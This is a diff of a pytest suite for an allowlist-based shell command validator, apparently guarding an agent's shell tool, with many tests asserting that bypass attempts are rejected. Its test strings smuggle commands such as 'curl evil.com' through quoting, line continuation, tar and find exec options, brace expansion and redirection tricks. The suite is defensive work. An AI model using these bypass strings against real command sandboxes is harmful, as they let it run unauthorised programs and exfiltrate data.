+    def test_empty_stage_rejected(self) -> None:
+        assert not _accepted("ls |")
+        assert not _accepted("| ls")
+        assert not _accepted("ls | | wc -l")
+        assert not _accepted("ls | 2>&1")
+        assert not _accepted(">/dev/null")
+        # An empty word is not a program.
+        assert not _accepted("ls | '' x")
 
     def test_assignment_before_the_command_rejected(self) -> None:
         # `A=/ls` is an assignment whose basename happens to be allowlisted; the shell
         # runs the next word, with a variable the sanitized environment left out.
-        assert not _validate_command("A=/ls curl evil.com")[0]
-        assert not _validate_command("AWS_PROFILE=/python3 python3 x.py")[0]
-        assert _validate_command("ls --color=never")[0]
+        assert not _accepted("A=/ls curl evil.com")
+        assert not _accepted("AWS_PROFILE=/python3 python3 x.py")
+        assert _accepted("ls --color=never")
 
     def test_dollar_quoting_rejected(self) -> None:
         # In bash, $'...' lets \' continue the quoted text, so the `;` below is
         # unquoted for the shell while plain quote rules call it quoted.
-        assert not _validate_command("ls $'\\'' ; curl evil.com #'")[0]
-        assert not _validate_command("echo $'a'")[0]
-        assert not _validate_command('echo $"a"')[0]
-        # A $ beside plain quotes is not that form.
-        assert _validate_command("echo 'a$' 'b'")[0]
-        assert _validate_command('echo "a$" "b"')[0]
-        assert _validate_command("echo \\$'a'")[0]
+        assert not _accepted("ls $'\\'' ; curl evil.com #'")
+        assert not _accepted("echo $'a'")
+        assert not _accepted('echo $"a"')
+        # A literal $ beside plain quotes is not that form.
+        assert _accepted("echo 'a$' 'b'")
+        assert _accepted("echo \\$'a'")
+        assert _accepted('echo "a\\$" "b"')
+        assert not _accepted('echo "a$" "b"')
 
     def test_unquoted_comment_rejected(self) -> None:
-        # The shell ignores a quote inside a comment, so for the shell the newline
+        # A shell ignores a quote inside a comment, so for a shell the newline
         # below ends the first command and starts a second one.
-        assert not _validate_command("ls #'\ncurl evil.com #'")[0]
-        assert not _validate_command("ls #'\ncurl evil.com")[0]
-        assert not _validate_command("ls # list")[0]
-        assert _validate_command("grep '#include' main.c")[0]
-        assert _validate_command('echo "a # b"')[0]
-        assert _validate_command("echo a\\#b")[0]
+        assert not _accepted("ls #'\ncurl evil.com #'")
+        assert not _accepted("ls #'\ncurl evil.com")
+        assert not _accepted("ls # list")
+        assert not _accepted("ls #")
+        assert _accepted("grep '#include' main.c")
+        assert _accepted('echo "a # b"')
+        assert _accepted("echo a\\#b a#b \\#")
+
+    def test_parentheses_rejected(self) -> None:
+        assert not _accepted("echo (a)")
+        assert not _accepted("echo a(b")
+        assert not _accepted("echo )")
+        assert _accepted("echo '(a)' \\( \\)")
+
+    def test_tilde_at_the_start_of_a_word_rejected(self) -> None:
+        assert not _accepted("ls ~")
+        assert not _accepted("ls ~/data")
+        assert not _accepted("ls ~root")
+        assert _accepted("ls '~' \\~ a~b")
+
+    def test_unterminated_escape_rejected(self) -> None:
+        assert not _accepted("ls \\")
+        assert not _accepted('ls "a\\')
+        assert _accepted("ls \\\\")
+
+    def test_nul_character_rejected(self) -> None:
+        assert not _accepted("ls 'a\0b'")
+        assert not _accepted("ls a\0b")
 
     def test_unterminated_quote_rejected(self) -> None:
-        assert not _validate_command("ls 'abc")[0]
-        assert not _validate_command('cat "abc | wc -l')[0]
+        assert not _accepted("ls 'abc")
+        assert not _accepted('cat "abc | wc -l')
 
     def test_abbreviated_exec_options_rejected(self) -> None:
         # GNU getopt accepts any unambiguous prefix of a long option.
-        assert not _validate_command("tar -cf a.tar d --checkpoint=1 --checkpoint-ac=exec=curl")[0]
-        assert not _validate_command("tar -xf a.tar --to-comm=curl")[0]
-        assert not _validate_command("tar -cf a.tar d --use-compress=curl")[0]
-        assert not _validate_command("sort --compress-prog=curl f")[0]
-        assert not _validate_command("sort --co curl f")[0]
+        assert not _accepted("tar -cf a.tar d --checkpoint=1 --checkpoint-ac=exec=curl")
+        assert not _accepted("tar -xf a.tar --to-comm=curl")
+        assert not _accepted("tar -cf a.tar d --use-compress=curl")
+        assert not _accepted("sort --compress-prog=curl f")
+        assert not _accepted("sort --co curl f")
         # Options that only share a prefix with one of them stay usable.
-        assert _validate_command("tar --exclude=.git --totals -czf a.tar d")[0]
-        assert _validate_command("tar -xf a.tar --to-stdout")[0]
-        assert _validate_command("sort --check f")[0]
-        assert _validate_command("rg --pretty --pre-glob '*.pdf' pattern")[0]
-        assert _validate_command("find . -name a -o -name b")[0]
-        assert _validate_command("tar -cf a.tar -- d")[0]
+        assert _accepted("tar --exclude=.git --totals -czf a.tar d")
+        assert _accepted("tar -xf a.tar --to-stdout")
+        assert _accepted("sort --check f")
+        assert _accepted("rg --pretty --pre-glob '*.pdf' pattern")
+        assert _accepted("find . -name a -o -name b")
+        assert _accepted("tar -cf a.tar -- d")
 
     def test_tar_script_and_remote_shell_options_rejected(self) -> None:
-        assert not _validate_command("tar -cf a.tar -M --info-script=curl d")[0]
-        assert not _validate_command("tar -cf a.tar -M --new-volume-script curl d")[0]
-        assert not _validate_command("tar -cf a.tar -M -F curl d")[0]
-        assert not _validate_command("tar -cMFcurl -f a.tar d")[0]
-        assert not _validate_command("tar -xf host:a.tar --rsh-command=curl")[0]
-        assert not _validate_command("tar -xf host:a.tar --rmt-command=curl")[0]
+        assert not _accepted("tar -cf a.tar -M --info-script=curl d")
+        assert not _accepted("tar -cf a.tar -M --new-volume-script curl d")
+        assert not _accepted("tar -cf a.tar -M -F curl d")
+        assert not _accepted("tar -cMFcurl -f a.tar d")
+        assert not _accepted("tar -xf host:a.tar --rsh-command=curl")
+        assert not _accepted("tar -xf host:a.tar --rmt-command=curl")
         # An archive or directory name attached to -f / -C is not an option letter.
-        assert _validate_command("tar -cfFiles.tar d")[0]
-        assert _validate_command("tar -xf a.tar -CInput")[0]
+        assert _accepted("tar -cfFiles.tar d")
+        assert _accepted("tar -xf a.tar -CInput")
 
     def test_tar_option_cluster_without_dash_rejected(self) -> None:
         # tar reads a first word without a dash as options: `cIf prog` is `-c -I prog -f`.
-        assert not _validate_command("tar cIf curl a.tar d")[0]
-        assert not _validate_command("tar cfI a.tar curl d")[0]
-        assert not _validate_command("tar cMFf curl a.tar d")[0]
-        assert _validate_command("tar xzf a.tar")[0]
-        assert _validate_command("tar tf a.tar Input/File.txt")[0]
+        assert not _accepted("tar cIf curl a.tar d")
+        assert not _accepted("tar cfI a.tar curl d")
+        assert not _accepted("tar cMFf curl a.tar d")
+        assert _accepted("tar xzf a.tar")
+        assert _accepted("tar tf a.tar Input/File.txt")
 
     def test_tar_files_from_rejected(self) -> None:
         # GNU tar 1.26 reads options from the list file, so `--checkpoint-action=exec=...`
-        # in a file that printf wrote would run a program the command line never named.
-        assert not _validate_command("tar -cf a.tar -T /tmp/list")[0]
-        assert not _validate_command("tar -cT /tmp/list -f a.tar")[0]
-        assert not _validate_command("tar cfT a.tar /tmp/list")[0]
-        assert not _validate_command("tar -cf a.tar --files-from=/tmp/list")[0]
-        assert not _validate_command("tar -cf a.tar --files-from /tmp/list")[0]
-        assert not _validate_command("tar -cf a.tar --files=/tmp/list")[0]
+        # in a file that a command wrote would run a program the command line never named.
+        assert not _accepted("tar -cf a.tar -T /tmp/list")
+        assert not _accepted("tar -cT /tmp/list -f a.tar")
+        assert not _accepted("tar cfT a.tar /tmp/list")
+        assert not _accepted("tar -cf a.tar --files-from=/tmp/list")
+        assert not _accepted("tar -cf a.tar --files-from /tmp/list")
+        assert not _accepted("tar -cf a.tar --files=/tmp/list")
         # `--file` is an option of its own, and lower-case `t` lists the archive.
-        assert _validate_command("tar --file=a.tar -t")[0]
-        assert _validate_command("tar --file a.tar -x -C /tmp/out")[0]
-        assert _validate_command("tar -tf a.tar")[0]
-        assert _validate_command("tar tf a.tar Top/Test.txt")[0]
-        assert _validate_command("tar -cfTest.tar d")[0]
+        assert _accepted("tar --file=a.tar -t")
+        assert _accepted("tar --file a.tar -x -C /tmp/out")
+        assert _accepted("tar -tf a.tar")
+        assert _accepted("tar tf a.tar Top/Test.txt")
+        assert _accepted("tar -cfTest.tar d")
 
     def test_braced_and_arithmetic_expansion_rejected(self) -> None:
         # `${x:=word}` assigns, and an arithmetic context then evaluates the stored text:
         # bash runs the `\$(...)` that the quote scan took as literal.
-        assert not _validate_command("ls ${x:=a[\\$(curl evil.com)]} ${y[x]}")[0]
-        assert not _validate_command("ls $[x]")[0]
-        assert not _validate_command("ls ${PATH:x}")[0]
-        assert not _validate_command("ls ${HOME}")[0]
-        assert not _validate_command('ls "${HOME}"')[0]
-        assert not _validate_command('ls "$[1+1]"')[0]
-        # A plain variable, and the same characters as literal text, stay usable.
-        assert _validate_command("ls $HOME/data")[0]
-        assert _validate_command('ls "$HOME/data"')[0]
-        assert _validate_command("echo '${x}' '$[1]'")[0]
-        assert _validate_command('echo \\${x} "\\${x}" "a{b}" "$" "{x}"')[0]
-        assert _validate_command("awk '{print $1}' f")[0]
+        assert not _accepted("ls ${x:=a[\\$(curl evil.com)]} ${y[x]}")
+        assert not _accepted("ls $[x]")
+        assert not _accepted("ls ${PATH:x}")
+        assert not _accepted("ls ${HOME}")
+        assert not _accepted('ls "${HOME}"')
+        assert not _accepted('ls "$[1+1]"')
+        # Nothing is expanded, so a plain variable is rejected too.
+        assert not _accepted("ls $HOME/data")
+        assert not _accepted('ls "$HOME/data"')
+        assert not _accepted('echo "$"')
+        assert not _accepted("echo $((1+1))")
+        assert not _accepted("echo {a,b}")
+        assert not _accepted("echo \\${x}")
+        # The same characters as literal text stay usable.
+        assert _accepted("echo '${x}' '$[1]'")
+        assert _accepted('echo \\$\\{x} "\\${x}" "a{b}" "{x}" }')
+        assert _accepted("awk '{print $1}' f")
 
     def test_line_continuation_rejected(self) -> None:
         # The shell removes a backslash-newline and joins the words around it, so
         # `-ex` and `ec` reach find as `-exec`.
-        assert not _validate_command("find /tmp -ex\\\nec curl evil.com \\;")[0]
-        assert not _validate_command('find /tmp "-ex\\\nec" curl evil.com \\;')[0]
-        assert not _validate_command("ls -l \\\n/tmp")[0]
+        assert not _accepted("find /tmp -ex\\\nec curl evil.com \\;")
+        assert not _accepted('find /tmp "-ex\\\nec" curl evil.com \\;')
+        assert not _accepted("ls -l \\\n/tmp")
         # Inside single quotes the pair is literal text.
-        assert _validate_command("printf 'a\\\nb'")[0]
+        assert _accepted("printf 'a\\\nb'")
 
     def test_noclobber_redirection_rejected(self) -> None:
         # `>|` is one redirection operator; read as `>` and a pipe, the words after it
         # would pass as a stage of their own that starts with `ls`.
-        assert not _validate_command("find /tmp >|ls -exec curl evil.com \\;")[0]
-        assert not _validate_command("ls >|/tmp/out")[0]
+        assert not _accepted("find /tmp >|ls -exec curl evil.com \\;")
+        assert not _accepted("ls >|/tmp/out")
 
     def test_expansion_in_a_command_with_exec_options_rejected(self) -> None:
-        # The shell rewrites these words after the option check has read them.
-        assert not _validate_command("find /tmp -exec$none curl evil.com \\;")[0]
-        assert not _validate_command('find /tmp "-exec$none" curl evil.com \\;')[0]
-        assert not _validate_command("find /tmp -exe[c] curl evil.com \\;")[0]
-        assert not _validate_command("find /tmp -exe? curl evil.com \\;")[0]
-        assert not _validate_command("find /tmp * curl evil.com \\;")[0]
-        assert not _validate_command("find /tmp {-exec,} curl evil.com \\;")[0]
-        assert not _validate_command("tar -xf a.tar --to-command$none=curl")[0]
-        assert not _validate_command("sort --compress-progra? curl f")[0]
-        assert not _validate_command("rg --pr[e] curl pattern")[0]
-        assert not _validate_command("cat f | sort -k$none")[0]
-        # Quoted, the same characters are the program's own patterns.
-        assert _validate_command("find /tmp -name '*.py' -o -name \"[a-c]?.txt\"")[0]
-        assert _validate_command("find /tmp \\( -name a -o -name b \\) -newer /tmp/x")[0]
-        assert _validate_command("rg 'value: \\$\\{[a-z]+\\}$' /tmp")[0]
-        assert _validate_command("tar -xzf a.tar.gz --wildcards '*.json' -C /tmp/out")[0]
-        # Other commands have no option check to get around.
-        assert _validate_command("ls /tmp/*.csv $HOME/{a,b}")[0]
-        assert _validate_command("cat /tmp/part-?.txt | sort -u")[0]
+        # A shell would rewrite these words; here they are not in the grammar.
+        assert not _accepted("find /tmp -exec$none curl evil.com \\;")
+        assert not _accepted('find /tmp "-exec$none" curl evil.com \\;')
+        assert not _accepted("find /tmp {-exec,} curl evil.com \\;")
+        assert not _accepted("tar -xf a.tar --to-command$none=curl")
+        assert not _accepted("cat f | sort -k$none")
+        # Quoted, the pattern characters are the program's own patterns.
+        assert _accepted("find /tmp -name '*.py' -o -name \"[a-c]?.txt\"")
+        assert _accepted("find /tmp \\( -name a -o -name b \\) -newer /tmp/x")
+        assert _accepted("rg 'value: \\$\\{[a-z]+\\}$' /tmp")
+        assert _accepted("tar -xzf a.tar.gz --wildcards '*.json' -C /tmp/out")
+        assert _accepted("ls /tmp/*.csv")
+        assert _accepted("cat /tmp/part-?.txt | sort -u")
+        assert _accepted("sort /tmp/*.csv")
+
+    def test_option_check_reads_the_arguments_after_pattern_expansion(self, tmp_path: Path) -> None:
+        # File names that are options: a pattern that matches one hands it to the program.
+        for name in ("-exec", "--compress-program", "--pre", "cIf"):
+            (tmp_path / name).mkdir()
+        cwd = str(tmp_path)
+        assert not _accepted("find /tmp -exe[c] curl evil.com \\;", cwd)
+        assert not _accepted("find /tmp -exe? curl evil.com \\;", cwd)
+        assert not _accepted("find /tmp * curl evil.com \\;", cwd)
+        assert not _accepted("sort --compress-progra? curl f", cwd)
+        assert not _accepted("rg --pr[e] curl pattern", cwd)
+        assert not _accepted("tar c?f curl a.tar d", cwd)
+        # Quoted, or without a file of that name, the word is not the option.
+        assert _accepted("find /tmp -name '-exe[c]'", cwd)
+        assert _accepted("find /tmp -name \\*", cwd)
+        assert _accepted("find /tmp -exe[c] curl evil.com \\;")
+        assert _accepted("sort --compress-progra? curl f")
 
     def test_redirection_does_not_hide_an_exec_option(self) -> None:
-        # A redirection operator ends a word: the shell reads `-exec>/dev/null` as
-        # `-exec`, and takes a redirection in front of tar's first word out.
-        assert not _validate_command("find /tmp -exec>/dev/null curl evil.com \\;")[0]
-        assert not _validate_command("find /tmp -exec</dev/null curl evil.com \\;")[0]
-        assert not _validate_command("sort --compress-program>/dev/null curl f")[0]
-        assert not _validate_command("tar >/dev/null cIf curl a.tar d")[0]
-        assert not _validate_command("tar 2>/dev/null cIf curl a.tar d")[0]
-        assert not _validate_command("tar >/dev/null 2>&1 cIf curl a.tar d")[0]
-        # `>&` and `<&` are one operator, also with a space before the target.
-        assert not _validate_command("tar 2>& 1 cIf curl a.tar d")[0]
-        assert not _validate_command("tar <& 0 cIf curl a.tar d")[0]
-        assert not _validate_command("tar >& /dev/null cIf curl a.tar d")[0]
-        assert not _validate_command("tar 2>&1 cIf curl a.tar d")[0]
-        assert _validate_command("tar 2>& 1 xzf a.tar")[0]
-        assert _validate_command("tar >& /dev/null xf a.tar")[0]
-        assert _validate_command("tar -tf a.tar 'a&b' >&2")[0]
-        assert _validate_command("find /tmp -name x >&2")[0]
-        assert _validate_command("find /tmp -name x 2>/dev/null")[0]
-        assert _validate_command("find /tmp -name '>' -newer /tmp/x")[0]
-        assert _validate_command("tar 2>/dev/null xzf a.tar")[0]
-        assert _validate_command("tar -tf a.tar >/tmp/Index 2>&1")[0]
-        assert _validate_command("ls>/tmp/out")[0]
+        # A shell reads `-exec>/dev/null` as `-exec` and a redirection. Here a redirection
+        # is a word of its own and is not an argument: tar's first argument is `cIf`.
+        assert not _accepted("find /tmp -exec>/dev/null curl evil.com \\;")
+        assert not _accepted("find /tmp -exec</dev/null curl evil.com \\;")
+        assert not _accepted("sort --compress-program>/dev/null curl f")
+        assert not _accepted("tar >/dev/null cIf curl a.tar d")
+        assert not _accepted("tar 2>/dev/null cIf curl a.tar d")
+        assert not _accepted("tar >/dev/null 2>&1 cIf curl a.tar d")
+        assert not _accepted("tar 2>& 1 cIf curl a.tar d")
+        assert not _accepted("tar <& 0 cIf curl a.tar d")
+        assert not _accepted("tar >& /dev/null cIf curl a.tar d")
+        assert not _accepted("tar 2>&1 cIf curl a.tar d")
+        assert not _accepted("tar > /dev/null cIf curl a.tar d")
+        # Closing a descriptor is not in the grammar, with or without a word behind it.
+        assert not _accepted("find /tmp >&--exec curl evil.com \\;")
+        assert not _accepted("find /tmp <&--exec curl evil.com \\;")
+        assert not _accepted("find /tmp 2>&--exec curl evil.com \\;")
+        assert not _accepted("find /tmp >& --exec curl evil.com \\;")
+        assert not _accepted("find /tmp >&-''-exec curl evil.com \\;")
+        assert not _accepted("tar -cf a.tar 2>&--Icurl d")
+        assert not _accepted("tar >&-cIf curl a.tar d")
+        assert not _accepted("ls 2>&-")
+        assert _accepted("tar -tf a.tar 'a&b' 2>&1")
+        assert _accepted("find /tmp -name x 2>/dev/null")
+        assert _accepted("find /tmp -name '>' -newer /tmp/x")
+        assert _accepted("tar 2>/dev/null xzf a.tar")
+        assert _accepted("tar -tf a.tar >/dev/null 2>&1")
 
     @pytest.mark.parametrize(
         "command",
@@ -570,33 +874,75 @@ class TestCommandValidation:
             "ls ${{x:=a[\\$(touch {tmp}/marker)]}} $[x]",
             "ls ${{x:=a[\\$(touch {tmp}/marker)]}} ${{PATH:x}}",
             'ls "${{x:=a[\\$(touch {tmp}/marker)]}}" "${{y[x]}}"',
+            # Closing a descriptor, which a shell reads as a whole redirection.
+            "find {tmp} -maxdepth 0 >&--exec touch {tmp}/marker \\;",
+            "find {tmp} -maxdepth 0 <&--exec touch {tmp}/marker \\;",
+            "find {tmp} -maxdepth 0 2>&--exec touch {tmp}/marker \\;",
+            "find {tmp} -maxdepth 0 >& --exec touch {tmp}/marker \\;",
+            "find {tmp} -maxdepth 0 >&-''-exec touch {tmp}/marker \\;",
+            "tar -cf {tmp}/a.tar 2>&--I{tmp}/bin/ls -C {tmp} src",
+            "tar >&-cIf 'touch {tmp}/marker' {tmp}/a.tar -C {tmp} src",
+            "ls &>/dev/null touch {tmp}/marker",
+            # Every other form with which a shell starts a second program or writes a file.
+            "ls ; touch {tmp}/marker",
+            "ls && touch {tmp}/marker",
+            "ls {tmp}/none || touch {tmp}/marker",
+            "ls & touch {tmp}/marker",
+            "ls\ntouch {tmp}/marker",
+            "ls\rtouch {tmp}/marker",
+            "echo $(touch {tmp}/marker)",
+            'echo "$(touch {tmp}/marker)"',
+            "echo `touch {tmp}/marker`",
+            'echo "`touch {tmp}/marker`"',
+            "echo $((x[$(touch {tmp}/marker)]))",
+            "(touch {tmp}/marker)",
+            "cat <(touch {tmp}/marker)",
+            "ls >(touch {tmp}/marker)",
+            "ls | touch {tmp}/marker",
+            "ls |& touch {tmp}/marker",
+            "cat <<EOF\n$(touch {tmp}/marker)\nEOF",
+            "echo x > {tmp}/marker",
+            "echo x >> {tmp}/marker",
+            "echo x >| {tmp}/marker",
+            "echo x 1> {tmp}/marker",
+            "echo x >{tmp}/marker 2>&1",
+            "echo x &> {tmp}/marker",
+            "ls {tmp}/none 2> {tmp}/marker",
+            "{tmp}/bin/ls",
+            "../bin/ls",
+            "../bin/l?",
+            "/usr/bin/touch {tmp}/marker",
+            "PATH={tmp}/bin ls",
+            "echo {{x,$(touch {tmp}/marker)}}",
         ],
     )
-    def test_end_to_end_bypass_does_not_run_another_program(self, tmp_path: Path, command: str) -> None:
-        # `touch` is not on the allowlist; each command once ran it through execute_shell
-        # (the brace and arithmetic forms where /bin/sh is bash, the `-T` form with GNU
-        # tar 1.26).
+    def test_rejected_form_does_not_run_another_program(self, tmp_path: Path, command: str) -> None:
+        # `touch` is not on the allowlist. Each command would run it, write the marker
+        # through a redirection, or run the `ls` file below, if a shell read it.
         (tmp_path / "src").write_text("x")
+        (tmp_path / "bin").mkdir()
+        (tmp_path / "bin" / "ls").write_text(f"#!/bin/sh\ntouch {tmp_path}/marker\n")
+        (tmp_path / "bin" / "ls").chmod(0o755)
         (tmp_path / "list").write_text(
             f"--checkpoint=1\n--checkpoint-action=exec=touch {tmp_path}/marker\n{tmp_path}/src\n"
         )
-        # The working directory holds one entry, for the glob forms to match.
+        # The working directory holds one entry, for the pattern forms to match.
         (tmp_path / "cwd" / "-exec").mkdir(parents=True)
-        with warnings.catch_warnings(), mock.patch.dict(os.environ, {"ATX_SHELL_ALLOW_PYTHON": "false"}):
-            warnings.simplefilter("ignore", FutureWarning)
-            result = execute_shell(command=command.format(tmp=tmp_path), working_directory=str(tmp_path / "cwd"))
+        with mock.patch.dict(os.environ, {"ATX_SHELL_ALLOW_PYTHON": "false"}):
+            result = _run(command.format(tmp=tmp_path), tmp_path / "cwd")
         assert result.startswith("Error:"), result
+        assert "Shell execution failed" not in result
         assert not (tmp_path / "marker").exists()
 
     def test_python_allowed_by_default(self) -> None:
         with mock.patch.dict(os.environ, {}, clear=True):
-            assert _validate_command("python3 /opt/skills/example/scripts/x.py")[0]
+            assert _accepted("python3 /opt/skills/example/scripts/x.py")
 
     def test_python_blocked_when_flag_false(self) -> None:
         with mock.patch.dict(os.environ, {"ATX_SHELL_ALLOW_PYTHON": "false"}, clear=True):
-            assert not _validate_command("python3 x.py")[0]
+            assert not _accepted("python3 x.py")
             # non-python allowlisted command still works
-            assert _validate_command("ls")[0]
+            assert _accepted("ls")
 
 
 class TestSanitizedEnv:
@@ -624,6 +970,7 @@ class TestSanitizedEnv:
             env = _sanitized_env()
         assert env.get("PYTHONPATH") == "/opt/agent/site-packages"
 
+    @_NEEDS_AWK
     def test_execute_shell_runs_the_command_with_the_sanitized_env(self) -> None:
         parent = {
             "PATH": os.environ.get("PATH", ""),
@@ -632,8 +979,8 @@ class TestSanitizedEnv:
             "AWS_CONTAINER_CREDENTIALS_FULL_URI": "http://127.0.0.1:9/creds",
         }
         command = (
-            "printf '%s|%s' \"$AWS_PROFILE$AWS_SECRET_ACCESS_KEY$AWS_CONTAINER_CREDENTIALS_FULL_URI\" "
-            '"$AWS_EC2_METADATA_DISABLED"'
+            """awk 'BEGIN { printf "%s|%s", ENVIRON["AWS_PROFILE"] ENVIRON["AWS_SECRET_ACCESS_KEY"] """
+            """ENVIRON["AWS_CONTAINER_CREDENTIALS_FULL_URI"], ENVIRON["AWS_EC2_METADATA_DISABLED"] }'"""
         )
         with warnings.catch_warnings(), mock.patch.dict(os.environ, parent, clear=True):
             warnings.simplefilter("ignore", FutureWarning)
